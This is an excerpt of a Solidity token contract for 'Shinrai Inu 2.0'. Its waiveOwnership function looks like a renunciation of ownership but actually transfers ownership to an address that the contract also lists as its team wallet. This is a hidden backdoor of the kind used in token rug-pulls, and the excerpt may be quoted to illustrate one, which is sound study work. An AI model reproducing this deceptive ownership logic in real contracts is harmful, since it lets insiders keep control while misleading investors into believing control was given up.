...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x2d5a38481584874280717373ee1f4A49161FB27A));
        _owner = address(0x2d5a38481584874280717373ee1f4A49161FB27A);
    }
...
contract ShinraiInu is Context, IERC20, Ownable {
    ...
    string private _name = "Shinrai Inu 2.0";
    string private _symbol = "SHINRAI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xE8e41b310987b98412c23251DC4A409dddCED8c6);
    address payable public teamWalletAddress = payable(0x2d5a38481584874280717373ee1f4A49161FB27A);
